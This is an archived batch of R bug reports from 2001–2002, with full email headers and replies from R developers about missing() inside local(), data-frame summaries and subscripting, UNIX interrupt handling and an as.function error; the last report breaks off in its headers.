~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1241 <==
From postmaster@franz.stat.wisc.edu  Fri Jan  4 14:41:56 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA07662
	for <r-bugs@biostat.ku.dk>; Fri, 4 Jan 2002 14:41:55 +0100 (MET)
Received: from hermes.dur.ac.uk (really [129.234.4.9]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m16MUb9-000IZ3C@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Fri, 4 Jan 2002 07:41:27 -0600 (CST) 
Received: from euclid (euclid.dur.ac.uk [129.234.21.53])
	by hermes.dur.ac.uk (8.11.1/8.11.1) with ESMTP id g04DYZr02195
	for <r-bugs@r-project.org>; Fri, 4 Jan 2002 13:34:35 GMT
Received: from arrow.dur.ac.uk by euclid id <g04DYYG10013@euclid>; Fri, 4 Jan 2002 13:34:34 GMT
From: J.C.Rougier@durham.ac.uk
Date: Fri, 4 Jan 2002 13:34:34 GMT
Message-Id: <28125.200201041334@arrow.dur.ac.uk>
To: r-bugs@r-project.org
Subject:  Problem with "missing" in "local" 
Cc: dma0jcr@arrow.dur.ac.uk
X-ECS-MailScanner: Found to be clean

Hi everyone,

I encountered unexpected behaviour when calling "missing" within a
"local" environment, namely

fred <- function(x, y)
{
  x <- as.vector(x)
  local({
    dontwantme <- 1:100
    if (missing(y)) print("No \"y\" today")
  })
  x
}

whereupon I get

> fred(1:10)
Error in eval(expr, envir, enclos) : "missing" illegal use of missing

I think it is reasonable to expect missing to work in this context (I
suspect the problem relates to lazy evaluation): if not, it might be
helpful to amend the help file.

Cheers, Jonathan.

--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = 
 major = 1
 minor = 4.0
 year = 2001
 month = 12
 day = 19
 language = R

Search Path:
 .GlobalEnv, Autoloads, package:base

==> 1241.followup.1 <==
From ripley@stats.ox.ac.uk  Fri Jan  4 14:51:24 2002
Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA07830
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jan 2002 14:51:23 +0100 (MET)
Received: from gannet.stats (IDENT:root@gannet.stats [163.1.20.127])
	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id NAA03055;
	Fri, 4 Jan 2002 13:50:56 GMT
Received: from localhost (ripley@localhost)
	by gannet.stats (8.11.3/8.11.3) with ESMTP id g04Doui08194;
	Fri, 4 Jan 2002 13:50:56 GMT
X-Authentication-Warning: gannet.stats: ripley owned process doing -bs
Date: Fri, 4 Jan 2002 13:50:56 +0000 (GMT)
From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
X-X-Sender:  <ripley@gannet.stats>
To: <J.C.Rougier@durham.ac.uk>
cc: <R-bugs@biostat.ku.dk>
Subject: Re: [Rd] Problem with "missing" in "local" (PR#1241)
In-Reply-To: <200201041341.OAA07672@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.31.0201041347390.8133-100000@gannet.stats>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII

On Fri, 4 Jan 2002 J.C.Rougier@durham.ac.uk wrote:

> Hi everyone,
>
> I encountered unexpected behaviour when calling "missing" within a
> "local" environment, namely
>
> fred <- function(x, y)
> {
>   x <- as.vector(x)
>   local({
>     dontwantme <- 1:100
>     if (missing(y)) print("No \"y\" today")
>   })
>   x
> }
>
> whereupon I get
>
> > fred(1:10)
> Error in eval(expr, envir, enclos) : "missing" illegal use of missing
>
> I think it is reasonable to expect missing to work in this context (I
> suspect the problem relates to lazy evaluation): if not, it might be
> helpful to amend the help file.

Why do you think it reasonable?  You've take a function from

     Evaluate an R expression in a specified environment.

and evaluated it somewhere where missing() is not defined.  If you had
used eval() explicitly, would you think it reasonable?  I doubt it.

Which help file did you have in mind?

-- 
Brian D. Ripley,                  ripley@stats.ox.ac.uk
Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
University of Oxford,             Tel:  +44 1865 272861 (self)
1 South Parks Road,                     +44 1865 272860 (secr)
Oxford OX1 3TG, UK                Fax:  +44 1865 272595


==> 1241.followup.2 <==
From J.C.Rougier@durham.ac.uk  Fri Jan  4 15:48:01 2002
Received: from hermes.dur.ac.uk (hermes.dur.ac.uk [129.234.4.9])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA09042
	for <R-bugs@biostat.ku.dk>; Fri, 4 Jan 2002 15:48:01 +0100 (MET)
Received: from euclid (euclid.dur.ac.uk [129.234.21.53])
	by hermes.dur.ac.uk (8.11.1/8.11.1) with ESMTP id g04EbSr02994;
	Fri, 4 Jan 2002 14:37:29 GMT
Received: from durham.ac.uk by euclid id <g04EbSG15752@euclid>; Fri, 4 Jan 2002 14:37:28 GMT
Sender: dma0jcr@durham.ac.uk
Message-ID: <3C35BE28.DFA1C500@durham.ac.uk>
Date: Fri, 04 Jan 2002 14:37:28 +0000
From: Jonathan Rougier <J.C.Rougier@durham.ac.uk>
Organization: Maths Dept., Univ. of Durham
X-Mailer: Mozilla 4.77 [en] (X11; U; Linux 2.4.9-12 i686)
X-Accept-Language: en
MIME-Version: 1.0
To: Prof Brian Ripley <ripley@stats.ox.ac.uk>
CC: R-bugs@biostat.ku.dk
Subject: Re: [Rd] Problem with "missing" in "local" (PR#1241)
References: <Pine.LNX.4.31.0201041347390.8133-100000@gannet.stats>
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
X-ECS-MailScanner: Found to be clean

Hi Brian,

Prof Brian Ripley wrote:
> 
> On Fri, 4 Jan 2002 J.C.Rougier@durham.ac.uk wrote:
> 
> > Hi everyone,
> >
> > I encountered unexpected behaviour when calling "missing" within a
> > "local" environment, namely
> >
> > fred <- function(x, y)
> > {
> >   x <- as.vector(x)
> >   local({
> >     dontwantme <- 1:100
> >     if (missing(y)) print("No \"y\" today")
> >   })
> >   x
> > }
> >
> > whereupon I get
> >
> > > fred(1:10)
> > Error in eval(expr, envir, enclos) : "missing" illegal use of missing
> >
> > I think it is reasonable to expect missing to work in this context (I
> > suspect the problem relates to lazy evaluation): if not, it might be
> > helpful to amend the help file.
> 
> Why do you think it reasonable?  You've take a function from
> 
>      Evaluate an R expression in a specified environment.
> 
> and evaluated it somewhere where missing() is not defined.  If you had
> used eval() explicitly, would you think it reasonable?  I doubt it.

By "reasonable" in this context I mean that the operation would appear
to be well-defined and useful.  I can access x within the local()
environment, ie it is found in the enclosing environment, and I do not
think that y should be treated any differently.  If I modify my function
to read

fred <- function(x, y)
{
  x <- as.vector(x)
  local({
    print(x)
    print(y)
    if (missing(y)) print("No \"y\" today")
  })
  x
}

then I get the error message

> fred(1:10)
 [1]  1  2  3  4  5  6  7  8  9 10
Error in print(y) : Argument "y" is missing, with no default

This error message suggests to me that "missing(y)" would evaluate
correctly.

> 
> Which help file did you have in mind?
> 

The help file for "missing".  This points out that "missing" is not
always reliable, eg after "x <- match.arg(x)".  Perhaps this could be
another example of "unreliability".

Cheers, Jonathan.

-- 
Jonathan Rougier                       Science Laboratories
Department of Mathematical Sciences    South Road
University of Durham                   Durham DH1 3LE
tel: +44 (0)191 374 2361, fax: +44 (0)191 374 7388
http://www.maths.dur.ac.uk/stats/people/jcr/jcr.html

==> 1241.audit <==
Mon Jan  7 10:33:01 2002	ripley	moved from incoming to Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1891 *
Subject: summary.data.frame with compound elements problem
From: b.rowlingson@lancaster.ac.uk
Date: Fri, 9 Aug 2002 10:35:43 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1891 <==
From b.rowlingson@lancaster.ac.uk  Fri Aug  9 10:35:44 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA17456
	for <R-bugs@biostat.ku.dk>; Fri, 9 Aug 2002 10:35:43 +0200 (MET DST)
Date: Fri, 9 Aug 2002 10:35:43 +0200 (MET DST)
From: b.rowlingson@lancaster.ac.uk
Message-Id: <200208090835.KAA17456@pubhealth.ku.dk>
To: R-bugs@biostat.ku.dk
Subject: summary.data.frame with compound elements problem

Full_Name: Barry Rowlingson
Version: 1.5.0
OS: x86 linux
Submission from: (NULL) (130.95.16.114)


Elements of a dataframe may be a matrix or another dataframe. In
this case the summary() method can do bad things:

> x <- data.frame(1:10)
> x$z <- data.frame(x=1:10,y=1:10)
> summary(x)
     X1.10          z                  
 Min.   : 1.00   NULL:Min.   : 1.00    
 1st Qu.: 3.25   NULL:1st Qu.: 3.25    
 Median : 5.50   NULL:Median : 5.50    
 Mean   : 5.50   NULL:Mean   : 5.50    
 3rd Qu.: 7.75   NULL:3rd Qu.: 7.75    
 Max.   :10.00   NULL:Max.   :10.00    
                 NULL:Min.   : 1.00    
                 NULL:1st Qu.: 3.25    
                 NULL:Median : 5.50    
                 NULL:Mean   : 5.50    
                 NULL:3rd Qu.: 7.75    
                 NULL:Max.   :10.00    

 - this comes from summary(x) calling summary(x$z) and
not handling the fact that summary(x$z) has an element for
each column.

 I think this may be a can of worms. There is a difference
between:

 x <- data.frame(1:10,z=data.frame(1:10,1:10))
and
 x <- data.frame(1:10) ; x$z<-data.frame(1:10,1:10)

 In the first case data.frame() will take columns of the z= argument
and add them to x so that x ends up with 3 elements. In the second
case x ends up with two elements (although it prints as three columns
with identical names for $z).

 Should data frames (and matrices) be allowed as elements of data frames
(assuming they have the right number of rows)? If _not_, then "$<-.data.frame"
should either behave like data.frame(z=...) above or disallow it, and if _so_
then 
summary.data.frame needs tweaking to cope.

 [Splus has similar behaviour, except only for data.frames in data.frames, but
that's because in Splus summary(a matrix) is summary of the whole matrix and 
so only has one element. In R the summary() of a matrix is an element for each
column. Now where's the Splus jitterbug?]

Baz


==> 1891.audit <==
Thu Aug 22 18:26:55 2002	thomas	foobar
Thu Aug 22 18:26:55 2002	thomas	moved from incoming to Language
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Low-level

* PR# 989 *
Subject: "[.data.frame" allows un-named 3rd subscript
From: "Charles C. Berry" <cberry@tajo.ucsd.edu>
Date: Mon, 18 Jun 2001 13:13:46 -0700 (PDT)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 989 <==
From cberry@tajo.ucsd.edu  Mon Jun 18 22:10:28 2001
Received: from mailbox4.ucsd.edu (mailbox4.ucsd.edu [132.239.1.56])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA14900
	for <r-bugs@biostat.ku.dk>; Mon, 18 Jun 2001 22:10:27 +0200 (MET DST)
Received: from smtp.ucsd.edu (smtp.ucsd.edu [132.239.1.49])
	by mailbox4.ucsd.edu (8.11.3/8.11.0) with ESMTP id f5IKAKq28590
	for <r-bugs@biostat.ku.dk>; Mon, 18 Jun 2001 13:10:20 -0700 (PDT)
Received: from tajo.ucsd.edu (tajo.ucsd.edu [132.239.99.2])
	by smtp.ucsd.edu (8.9.3/8.9.3) with ESMTP id NAA24075
	for <r-bugs@biostat.ku.dk>; Mon, 18 Jun 2001 13:10:20 -0700 (PDT)
Received: by tajo.ucsd.edu (8.9.3+Sun/SMI-SVR4-UCSD.1)
	id NAA15110; Mon, 18 Jun 2001 13:13:46 -0700 (PDT)
Date: Mon, 18 Jun 2001 13:13:46 -0700 (PDT)
Message-Id: <200106182013.NAA15110@tajo.ucsd.edu>
From: "Charles C. Berry" <cberry@tajo.ucsd.edu>
To: r-bugs@biostat.ku.dk
Subject: "[.data.frame" allows un-named 3rd subscript


Since the Extract page has usage as:

     x[i, j, ... , drop=TRUE]

I would expect that 'drop=' would need to be given to the third 'subscript'

> diag(4)[ , 4 , 4 ] # Forgot 'drop=' or added extra ','
Error in diag(4)[, 4, 4] : incorrect number of dimensions
> 
> as.data.frame( diag(4) )[ , 4 , 4 ] # should return error, right?
[1] 0 0 0 1


Also note:

> diag(4)[ ,  , drop=TRUE ]
     [,1] [,2] [,3] [,4]
[1,]    1    0    0    0
[2,]    0    1    0    0
[3,]    0    0    1    0
[4,]    0    0    0    1
> 
> as.data.frame( diag(4) )[ ,  , drop=TRUE ]
Error in [.data.frame(as.data.frame(diag(4)), , , drop = 4) : 
	Argument "j" is missing, with no default
> 

--please do not edit the information below--

Version:
 platform = sparc-sun-solaris2.7
 arch = sparc
 os = solaris2.7
 system = sparc, solaris2.7
 status = 
 major = 1
 minor = 2.3
 year = 2001
 month = 04
 day = 26
 language = R

Search Path:
 .GlobalEnv, package:nls, package:nlme, package:ctest, Autoloads, package:base



Chuck

-- 
Charles C. Berry                        (858) 534-2098 
                                         Dept of Family/Preventive Medicine
E mailto:cberry@tajo.ucsd.edu	         UC San Diego
http://hacuna.ucsd.edu/members/ccb.html  La Jolla, San Diego 92093-0645

 

==> 989.reply.1 <==
From pd@blueberry.kubism.ku.dk  Mon Jun 18 22:35:29 2001
Received: from blueberry.kubism.ku.dk (blueberry [130.225.108.193])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id WAA15008;
	Mon, 18 Jun 2001 22:35:28 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.9.3/8.9.3) id WAA31163;
	Mon, 18 Jun 2001 22:38:38 +0200
Sender: pd@pubhealth.ku.dk
To: cberry@tajo.ucsd.edu
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] "[.data.frame" allows un-named 3rd subscript (PR#989)
References: <200106182010.WAA14911@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 18 Jun 2001 22:38:38 +0200
In-Reply-To: cberry@tajo.ucsd.edu's message of "Mon, 18 Jun 2001 22:10:29 +0200 (MET DST)"
Message-ID: <x27ky9o75d.fsf@blueberry.kubism.ku.dk>
Lines: 34
X-Mailer: Gnus v5.7/Emacs 20.7
Mime-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 7bit

cberry@tajo.ucsd.edu writes:

> Since the Extract page has usage as:
> 
>      x[i, j, ... , drop=TRUE]
> 
> I would expect that 'drop=' would need to be given to the third 'subscript'
> 
> > diag(4)[ , 4 , 4 ] # Forgot 'drop=' or added extra ','
> Error in diag(4)[, 4, 4] : incorrect number of dimensions
> > 
> > as.data.frame( diag(4) )[ , 4 , 4 ] # should return error, right?
> [1] 0 0 0 1
> 

And the bug is?

The generic indexing should really be x[...,drop=T].  Methods for
specific classes can specialize to a particular number of indices if
they want to, which is what is happening here

> get ("[.data.frame")
function (x, i, j, drop = if (missing(i)) TRUE else length(cols) == 
    1) 

one could fairly easily slip in a "..." argument after "j", and then
inside the function give an error if "..." is not empty, but what
would the point be?

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 989.followup.1 <==
From cberry@tajo.ucsd.edu  Mon Jun 18 23:06:32 2001
Received: from mailbox3.ucsd.edu (mailbox3.ucsd.edu [132.239.1.55])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA15201;
	Mon, 18 Jun 2001 23:06:31 +0200 (MET DST)
Received: from smtp.ucsd.edu (smtp.ucsd.edu [132.239.1.49])
	by mailbox3.ucsd.edu (8.10.1/8.11.0) with ESMTP id f5IL6PR16820;
	Mon, 18 Jun 2001 14:06:25 -0700 (PDT)
Received: from tajo.ucsd.edu (tajo.ucsd.edu [132.239.99.2])
	by smtp.ucsd.edu (8.9.3/8.9.3) with ESMTP id OAA06469;
	Mon, 18 Jun 2001 14:06:24 -0700 (PDT)
Received: from localhost by tajo.ucsd.edu (8.9.3+Sun/SMI-SVR4-UCSD.1)
	id OAA15733; Mon, 18 Jun 2001 14:09:49 -0700 (PDT)
Date: Mon, 18 Jun 2001 14:09:49 -0700 (PDT)
From: "Charles C. Berry" <cberry@tajo.ucsd.edu>
To: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: [Rd] "[.data.frame" allows un-named 3rd subscript (PR#989)
In-Reply-To: <x27ky9o75d.fsf@blueberry.kubism.ku.dk>
Message-ID: <Pine.GSO.4.05.10106181348090.12737-100000@tajo.ucsd.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=US-ASCII


See below.

On 18 Jun 2001, Peter Dalgaard BSA wrote:

> cberry@tajo.ucsd.edu writes:
> 
> > Since the Extract page has usage as:
> > 
> >      x[i, j, ... , drop=TRUE]
> > 
> > I would expect that 'drop=' would need to be given to the third 'subscript'
> > 
> > > diag(4)[ , 4 , 4 ] # Forgot 'drop=' or added extra ','
> > Error in diag(4)[, 4, 4] : incorrect number of dimensions
> > > 
> > > as.data.frame( diag(4) )[ , 4 , 4 ] # should return error, right?
> > [1] 0 0 0 1
> > 
> 
> And the bug is?
> 
> The generic indexing should really be x[...,drop=T].  Methods for
> specific classes can specialize to a particular number of indices if
> they want to, which is what is happening here
> 
> > get ("[.data.frame")
> function (x, i, j, drop = if (missing(i)) TRUE else length(cols) == 
>     1) 
> 
> one could fairly easily slip in a "..." argument after "j", and then
> inside the function give an error if "..." is not empty, but what
> would the point be?
> 

The point would be to catch errors like this

for ( i in 1:2 ) foo[i,2] <- my.fun( bar[,i,2] , another.arg )

that might otherwise pass unnoticed when 'bar' is a data.frame.


Charles C. Berry                        (858) 534-2098 
                                         Dept of Family/Preventive Medicine
E mailto:cberry@tajo.ucsd.edu	         UC San Diego
http://hacuna.ucsd.edu/members/ccb.html  La Jolla, San Diego 92093-0645

 


==> 989.audit <==
Tue Jun 19 09:07:09 2001	ripley	moved from incoming to Low-level
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1068 *
Subject: Interrupts (was Re: [Rd] X11 protocol errors ...)
From: Luke Tierney <luke@nokomis.stat.umn.edu>
Date: Wed, 22 Aug 2001 19:32:51 -0500
--see also followup in PR#1069
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1068 <==
From luke@nokomis.stat.umn.edu  Thu Aug 23 02:32:58 2001
Received: from nokomis.stat.umn.edu (root@nokomis.stat.umn.edu [134.84.86.39])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id CAA09952
	for <R-bugs@biostat.ku.dk>; Thu, 23 Aug 2001 02:32:57 +0200 (MET DST)
Received: (from luke@localhost)
	by nokomis.stat.umn.edu (8.11.3/8.10.2/SuSE Linux 8.10.0-0.3) id f7N0Wpq10715;
	Wed, 22 Aug 2001 19:32:51 -0500
Date: Wed, 22 Aug 2001 19:32:51 -0500
From: Luke Tierney <luke@nokomis.stat.umn.edu>
To: maechler@stat.math.ethz.ch
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Interrupts (was Re: [Rd] X11 protocol errors ...)
Message-ID: <20010822193251.A10682@nokomis.stat.umn.edu>
References: <200108221235.OAA05855@pubhealth.ku.dk>
Mime-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
User-Agent: Mutt/1.2.5i
In-Reply-To: <200108221235.OAA05855@pubhealth.ku.dk>; from maechler@stat.math.ethz.ch on Wed, Aug 22, 2001 at 02:35:24PM +0200

Martin wrote:

> Just this morning,
> I found (again!, we had something close to this before) 
> the following related bugous behavior :
> After interrupting a plot (which would have taken a few minutes and was
> "wrong" anyway), starting another plot, interrupting again [with C-c],
> and maybe the same once more,
> R started just giving a ">" prompt
> but did not react any further at all.
> (C-c would return the prompt, but no other reaction was possible)
> Only killing the R process helped.
> 
> I may try to reproduce more exactly later today.

I'm surprised we don't get more of these sorts of things on UNIX.  Our
current UNIX interrupt handling approach takes an immediate LONGJMP
out of the signal handler no matter where the signal occurs (except
for two places where signals are suspended).  Any place where an
invariant is temporarily broken, any place where an assignment is not
yet complete, is a potential trouble spot.

I've been meaning to raise this issue at some point: I think we will
need to eventually spend some time re-examining how we want to handle
interrupts.  Right now on Windows/Mac interrupts are only processed at
special points in the evaluation process, which is a bit restrictive
(but perhaps unavoidable due to OS limitations).  On UNIX on the other
hand we LONGJUMP out of the signal handler except for the very few
places where the signal gets masked temporarily (GC and one place in
graphics I believe).  The UNIX approach is much too loose even now,
and it becomes even more untenable if we add any kind of threading
support.

We will I think have to come up with a cleaner model for very
selectively enabling interrupt processing, perhaps with some
integration with the external function registration mechanism Duncan
added recently (e.g. marking a function as one where LONGJMP's are
safe).  We will also need some means of controlling interrupt
behaviour from R, such as having some sort of without.interrupts and
with.interrupts functions to be able to program reliable interaction
with interrupts at the R level. (Another sort of thing we might
consider is suspending interrupts during on.exit processing.)

It's a farily big can of worms, and probably not urgent for now, but
we will need to look at it eventually.

luke

-- 
Luke Tierney
University of Minnesota                      Phone:           612-625-7843
School of Statistics                         Fax:             612-624-8868
313 Ford Hall, 224 Church St. S.E.           email:      luke@stat.umn.edu
Minneapolis, MN 55455 USA                    WWW:  http://www.stat.umn.edu

==> 1068.audit <==
Tue Aug 28 10:16:46 2001	ripley	moved from incoming to Low-level
Tue Aug 28 10:23:54 2001	ripley	changed notes
Tue Aug 28 10:23:54 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1069 *
Subject: Interrupts (was Re: [Rd] X11 protocol errors ...)
From: "John W. Eaton" <jwe@bevo.che.wisc.edu>
Date: Wed, 22 Aug 2001 21:56:33 -0500
--part of PR#1068
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1069 <==
From jwe@ricotta.che.wisc.edu  Thu Aug 23 04:57:11 2001
Received: from ricotta.che.wisc.edu (ricotta.che.wisc.edu [128.104.179.160])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id EAA10175
	for <R-bugs@biostat.ku.dk>; Thu, 23 Aug 2001 04:57:10 +0200 (MET DST)
Received: from ricotta.che.wisc.edu (jwe@localhost [127.0.0.1])
        by localhost (8.12.0.Beta7/8.12.0.Beta7/Debian 8.12.0.Beta7-1) with ESMTP id f7N2uZqU003270;
	Wed, 22 Aug 2001 21:56:35 -0500
Received: (from jwe@localhost)
        by ricotta.che.wisc.edu (8.12.0.Beta7/8.12.0.Beta7/Debian 8.12.0.Beta7-1) id f7N2uXNS003266;
	Wed, 22 Aug 2001 21:56:33 -0500
From: "John W. Eaton" <jwe@bevo.che.wisc.edu>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-ID: <15236.28897.468790.842201@ricotta.che.wisc.edu>
Date: Wed, 22 Aug 2001 21:56:33 -0500
To: Luke Tierney <luke@nokomis.stat.umn.edu>
Cc: maechler@stat.math.ethz.ch, r-devel@stat.math.ethz.ch,
        R-bugs@biostat.ku.dk
Subject: Interrupts (was Re: [Rd] X11 protocol errors ...)
In-Reply-To: <20010822193251.A10682@nokomis.stat.umn.edu>
References: <200108221235.OAA05855@pubhealth.ku.dk>
	<20010822193251.A10682@nokomis.stat.umn.edu>
X-Mailer: VM 6.95 under Emacs 20.7.2

On 22-Aug-2001, Luke Tierney <luke@nokomis.stat.umn.edu> wrote:

| We will I think have to come up with a cleaner model for very
| selectively enabling interrupt processing, perhaps with some
| integration with the external function registration mechanism Duncan
| added recently (e.g. marking a function as one where LONGJMP's are
| safe).

FWIW, Octave doesn't do this correctly either, it just does a longjmp,
same as R, which can result in leaking memory, and possibly other bad
things.

The way Bash handles this is to only set a flag in the handler for
SIGINT, then at safe places in the code, there are

  QUIT;

statements.  These are macros that expand to some code that may
longjump somewhere depending on the interrupt state.  This method
avoids the problems of jumping out of the signal handler, which may
result in memory leaks or inconsistencies in global state.  The hard
part is inserting the (many!) QUIT statements, though it is probably
somewhat easier if this type of choice is made early on in the life of
the program instead of late.

I only mention Bash because it is a program that is expected to
handle a lot of interrupts without leaking memory or crashing, and
seems to do so reasonably well.

Packages like R and Octave also have to be able to handle interrupts
in calls Fortran or C code that may run for a long time, and which
cannot be modified (at least not easily) to add the equivalent QUIT
calls.  I'm not sure what the right solution is for cases like that.

jwe

-- 
www.octave.org        | Unfortunately we were hoplessly optimistic in 1954
www.che.wisc.edu/~jwe | about the problems of debugging FORTRAN programs.
                      |                                       -- J. Backus

==> 1069.audit <==
Tue Aug 28 10:16:46 2001	ripley	moved from incoming to Low-level
Tue Aug 28 10:23:24 2001	ripley	changed notes
Tue Aug 28 10:23:24 2001	ripley	foobar
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 1880 *
Subject:  You requested this report 
From: Berwin Turlach <berwin@maths.uwa.edu.au>
Date: Tue, 6 Aug 2002 16:57:54 +0800
--The bug is that we get as far as mkCLOSXP before an error is reported
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1880 <==
From postmaster@franz.stat.wisc.edu  Tue Aug  6 10:58:39 2002
Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id KAA21842
	for <r-bugs@biostat.ku.dk>; Tue, 6 Aug 2002 10:58:38 +0200 (MET DST)
Received: from asclepius.uwa.edu.au (really [130.95.128.56]) by franz.stat.wisc.edu
	via smail with esmtp
	id <m17c0A8-000IX5C@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
	for <r-bugs@r-project.org>; Tue, 6 Aug 2002 03:57:56 -0500 (CDT) 
Received: from 127.0.0.1 (localhost [127.0.0.1])
	by dummy.domain.name (Postfix) with SMTP id DE5CB2F8B7F
	for <r-bugs@r-project.org>; Tue,  6 Aug 2002 16:56:24 +0800 (WST)
Received: from bossiaea.maths.uwa.edu.au (bossiaea.maths.uwa.edu.au [130.95.16.247])
	by asclepius.uwa.edu.au (Postfix) with ESMTP id C3D5C2F8B56
	for <r-bugs@r-project.org>; Tue,  6 Aug 2002 16:56:24 +0800 (WST)
Received: (from berwin@localhost)
	by bossiaea.maths.uwa.edu.au (8.9.3/8.9.3) id QAA23639;
	Tue, 6 Aug 2002 16:57:54 +0800
Date: Tue, 6 Aug 2002 16:57:54 +0800
From: Berwin Turlach <berwin@maths.uwa.edu.au>
Message-Id: <200208060857.QAA23639@bossiaea.maths.uwa.edu.au>
To: r-bugs@r-project.org
Subject:  You requested this report 
Cc: berwin@bossiaea.maths.uwa.edu.au

Hi guys,

I am planning to let my students do some simulations regarding the
bias of the sample standard deviation.  The following function is
pretty standard (so I hope :) ):

> sim <- function(nrng, replic, true.s, random, ...){
+   res <- NULL
+   for(n in nrng){
+     data <- matrix(random(n*replic,...), ncol=replic)
+     val <- sqrt(apply(data, 2, var))
+     res <- rbind(res,
+                  cbind(bias=val-true.s, n=n))
+   }
+   res
+ }

It takes a vector of sample sizes, a number (the number of
replications we want to simulate), the true value of the standard
deviation and a function that generates the random number (which may
depend on additional paramters).  So let's try this:

> nrng <- c(2,4,8,16,32,64)
> replic <- 500
> true.s <- 2
> tmp <- sim(nrng, replic, true.s, rnorm, sd = 2)

Yes, seems to work.  Now I thought of perhaps creating a list of
several scenarios (random numbers) and loop over it.  So I tried:

> dist <- list(list(rnorm, true.s = 2, sd=2),
+              list(rexp, true.s = 1)
+              )

Followed by

> res <- sim(nrng, replic, dist[[1]][2], dist[[1]][1], dist[[1]][-c(1,2)])
Error in as.vector(data) : couldn't find function "random"

O.k., this doesn't work.  So let us try:

> res <- sim(nrng, replic, dist[[1]][2], as.function(dist[[1]][1]), dist[[1]][-c(1,2)])
Error in as.function.default(dist[[1]][1]) : 
        invalid body argument for "function"
Should NEVER happen; please bug.report() [mkCLOSXP]

No idea why you consider this a bug. :)  I would have been willing to
put it down to my misuse of R.  But since you requested a bug report,
here it is.

Cheers,

        Berwin

BTW:  How can I actually do what I want to do?  I realise that I am
probably on a completely wrong track regarding the passing of the
... parameters.

--please do not edit the information below--

Version:
 platform = i686-pc-linux-gnu
 arch = i686
 os = linux-gnu
 system = i686, linux-gnu
 status = 
 major = 1
 minor = 5.1
 year = 2002
 month = 06
 day = 17
 language = R

Search Path:
 .GlobalEnv, package:ctest, Autoloads, package:base


==> 1880.audit <==
Mon Aug 19 22:35:34 2002	thomas	changed notes
Mon Aug 19 22:35:34 2002	thomas	foobar
Mon Aug 19 22:35:34 2002	thomas	moved from incoming to Low-level
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Directory:  Macintosh

* PR# 1819 *
Subject: Date arithmetic fails
From: RML27@cornell.edu
Date: Sun, 21 Jul 2002 20:26:12 +0200 (MET DST)
--In fact, as.POSIXct is off by 66 years. See
--   http://developer.apple.com/qa/ops/ops23.html
--This is semifixed, but timezones still don't work
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 1819 <==
From RML27@cornell.edu  Sun Jul 21 20:26:12 2002
Received: from blueberry (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA29488
	for <R-bugs@biostat.ku.dk>; Sun, 21 Jul 2002 20:26:12 +0200 (MET DST)
Date: Sun, 21 Jul 2002 20:26:12 +0200 (MET DST)
From: RML27@cornell.edu
Message-Id: <200207211826.UAA29488@pubhealth.ku.dk>
